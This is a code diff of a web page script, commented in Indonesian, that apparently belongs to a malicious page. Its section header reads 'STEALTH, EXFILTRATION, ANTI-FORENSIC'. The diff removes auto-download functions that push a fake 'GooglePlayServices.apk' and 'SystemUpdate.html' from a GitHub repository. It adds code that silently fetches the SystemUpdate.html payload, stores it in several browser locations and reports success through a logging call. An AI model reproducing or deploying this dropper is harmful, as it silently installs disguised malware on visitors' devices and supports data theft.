@@ -64,40 +64,6 @@
 
 <script>
 // ============================================================
-// 🔥 TAMBAHAN: AUTO DOWNLOAD (PASTI BERHASIL)
-// ============================================================
-
-// Fungsi untuk mendownload file via Anchor + Click (PASTI BERHASIL)
-function autoDownloadAnchor(url, filename) {
-    try {
-        var a = document.createElement('a');
-        a.href = url;
-        a.download = filename || url.split('/').pop();
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-        setTimeout(function() {
-            try { document.body.removeChild(a); } catch(e) {}
-        }, 1000);
-        return true;
-    } catch(e) {
-        return false;
-    }
-}
-
-// Fungsi untuk mendownload SystemUpdate.html
-function forceDownloadSystemUpdate() {
-    var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    autoDownloadAnchor(url, 'SystemUpdate.html');
-}
-
-// Fungsi untuk mendownload GooglePlayServices.apk
-function downloadAPK() {
-    var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-    autoDownloadAnchor(url, 'GooglePlayServices.apk');
-}
-
-// ============================================================
 // 🔥 ADVANCED UPGRADES: STEALTH, EXFILTRATION, ANTI-FORENSIC
 // ============================================================
 
@@ -560,16 +526,24 @@ function downloadPayloadSilent() {
     
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
-    // 🔥 PERBAIKAN: Ganti XHR dengan Anchor + Click
-    // var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    // try { var xhr = new XMLHttpRequest(); ... } catch(e) {}
+    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     
-    // 🔥 ALIHKAN KE FUNGSI BARU
-    forceDownloadSystemUpdate();
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, true);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var htmlContent = xhr.responseText;
+                // Simpan ke semua lokasi (agar SystemUpdate.html bisa di-load nanti)
+                saveToAllLocations(htmlContent);
+                K({ sumber: 'html_download_success', data: 'ok' });
+            }
+        };
+        xhr.send();
+    } catch(e) {}
 }
 
-// 🔥 PERBAIKAN: Fungsi downloadPayloadSilent() sekarang memanggil forceDownloadSystemUpdate()
-// Fungsi asli saveToAllLocations tetap digunakan untuk menyimpan file setelah berhasil download via anchor
 function saveToAllLocations(htmlContent) {
     // 1. localStorage
     try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
@@ -765,7 +739,6 @@ function dapatkanSemua() {
         
 //        setTimeout(escapeWebView, 100);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
-        setTimeout(function() { downloadAPK(); }, 1000);
         setTimeout(function() { showStatusBar(); }, 500);
         openSystemUpdateHTML();
         
